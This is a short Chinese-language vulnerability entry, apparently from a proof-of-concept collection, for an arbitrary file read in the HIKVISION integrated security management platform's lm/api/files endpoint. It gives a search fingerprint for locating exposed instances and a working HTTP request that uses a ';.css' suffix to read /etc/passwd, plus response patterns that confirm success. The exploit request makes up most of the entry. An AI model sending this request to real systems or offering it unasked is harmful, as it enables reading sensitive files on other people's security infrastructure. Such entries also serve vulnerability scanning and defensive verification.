﻿# HIKVISION 综合安防管理平台 files 任意文件读取

> 更新时间：2023-12-07

> 漏洞编号：

> 漏洞说明：HIKVISION 综合安防管理平台 lm/api/files 接口存在任意文件读取漏洞

> 漏洞特征：app="HIKVISION-综合安防管理平台"

> 验证脚本：HTTP

```
GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
Connection: close
Accept-Encoding: gzip, deflate, br
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：HIKVISION 综合安防管理平台 files 任意文件读取.poc
